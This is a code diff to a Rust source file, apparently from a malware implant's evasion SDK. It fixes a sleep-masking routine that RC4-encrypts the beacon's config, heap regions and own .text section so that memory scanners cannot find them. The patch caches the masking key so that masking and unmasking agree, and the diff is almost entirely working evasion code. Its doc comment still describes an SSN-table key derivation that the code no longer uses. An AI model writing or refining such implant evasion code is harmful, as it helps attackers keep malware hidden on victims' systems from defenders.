@@ -35,6 +35,17 @@ use nyx_implant_evasionsdk::rc4::Rc4;
 /// RC4 round-trip is two *independent* oneshot calls with the SAME key, so a
 /// double-mask produces keystream∘keystream, not cleartext).
 static MASK_STATE: AtomicU8 = AtomicU8::new(0);
+/// Per-process RC4 mask key, cached ONCE on first use. The original code
+/// regenerated a fresh key on every `mask_key()` call, so `mask()` derived key
+/// A while `unmask()` derived key B → the regions were NOT restored (corrupted
+/// with keystream∘keystream). RC4 round-trip requires the SAME key for both
+/// passes, so the key MUST be stable for the process lifetime. Stored in a
+/// `static mut` buffer guarded by an init flag — no heap allocation, no leak
+/// (a leaked `Box` would grow the heap needlessly; the key is process-lifetime
+/// by definition, but ownership belongs in a static here).
+static mut MASK_KEY_BUF: [u8; 32] = [0u8; 32];
+/// 0 = MASK_KEY_BUF uninitialized, 1 = populated.
+static MASK_KEY_INIT: AtomicU8 = AtomicU8::new(0);
 
 /// Cap on the number of registered sensitive regions. Covers:
 /// - config plaintext (1)
@@ -98,22 +109,41 @@ pub fn register_key(key: [u8; 32]) -> bool {
 }
 
 /// Derive a per-run RC4 key from the syscall runtime's SSN table (a per-boot
-/// unpredictable value) so the keystream differs across runs without a CSPRNG.
-/// Expands the 32-bit seed into a 32-byte key (RC4 has no key-length ceiling).
-/// Falls back to a fixed marker key if the runtime isn't up yet.
-pub(crate) fn mask_key() -> [u8; 32] {
+/// unpredictable value) so the keystream differs across runs without a CSPRNG,
+/// AND cache it for the process lifetime so `mask`/`unmask` use the SAME key.
+/// RC4 round-trip is two independent oneshot calls with an identical key; the
+/// original code called `csprng_fill` on every invocation, so `mask()` used key
+/// A and `unmask()` used key B → the regions were corrupted, not restored.
+/// Falls back to an rdtsc-seeded key if the CSPRNG isn't up yet; the fallback
+/// is also cached once so mask/unmask still agree.
+///
+/// Returns a `&'static [u8; 32]` so every caller shares the single cached key.
+pub(crate) fn mask_key() -> &'static [u8; 32] {
+    // Fast path: already initialized.
+    if MASK_KEY_INIT.load(Ordering::Acquire) == 1 {
+        // SAFETY: MASK_KEY_BUF is populated and never mutated again after
+        // init; the beacon is single-threaded (documented invariant) so there
+        // is no concurrent mutation.
+        return unsafe { &MASK_KEY_BUF };
+    }
     let mut key = [0u8; 32];
-    if crate::entry::csprng_fill(&mut key) {
-        key
-    } else {
-        // Dynamic fallback using a tick count or high-resolution timer to maintain key diversity
+    if !crate::entry::csprng_fill(&mut key) {
+        // Dynamic fallback using a tick count or high-resolution timer to
+        // maintain key diversity. Still cached once so mask/unmask agree.
         let mut acc = unsafe { core::arch::x86_64::_rdtsc() };
         for b in key.iter_mut() {
             acc = acc.wrapping_mul(0x9E37_79B9).rotate_left(7);
             *b = (acc & 0xFF) as u8;
         }
-        key
     }
+    // Publish the key, then set the init flag (Release pairs with the Acquire
+    // load above so a racing reader observes the bytes before init==1).
+    // SAFETY: single-threaded beacon; MASK_KEY_BUF is not concurrently accessed.
+    unsafe {
+        MASK_KEY_BUF = key;
+    }
+    MASK_KEY_INIT.store(1, Ordering::Release);
+    unsafe { &MASK_KEY_BUF }
 }
 
 /// Apply RC4 (via the pure core) to every registered region in place. RC4 is an
@@ -136,7 +166,7 @@ fn apply_rc4_to_regions() {
         let region = unsafe { core::slice::from_raw_parts_mut(ptr as *mut u8, len) };
         // Fresh cipher per region so each starts from KSA-zero (deterministic
         // round-trip: mask then unmask with the same key restores the bytes).
-        Rc4::apply_oneshot(&key, region);
+        Rc4::apply_oneshot(key, region);
     }
 }
 
@@ -289,8 +319,8 @@ pub fn unmask_heap_regions(key: &[u8]) {
 /// (decrypted), and returned. The caller compares against the pre-call bytes.
 pub fn round_trip_selftest(input: &mut [u8]) {
     let key = mask_key();
-    Rc4::apply_oneshot(&key, input); // encrypt
-    Rc4::apply_oneshot(&key, input); // decrypt (same key, fresh cipher)
+    Rc4::apply_oneshot(key, input); // encrypt
+    Rc4::apply_oneshot(key, input); // decrypt (same key, fresh cipher)
 }
 
 /// Mask the implant `.text` region in place: flip RX→RW, RC4-encrypt. For use
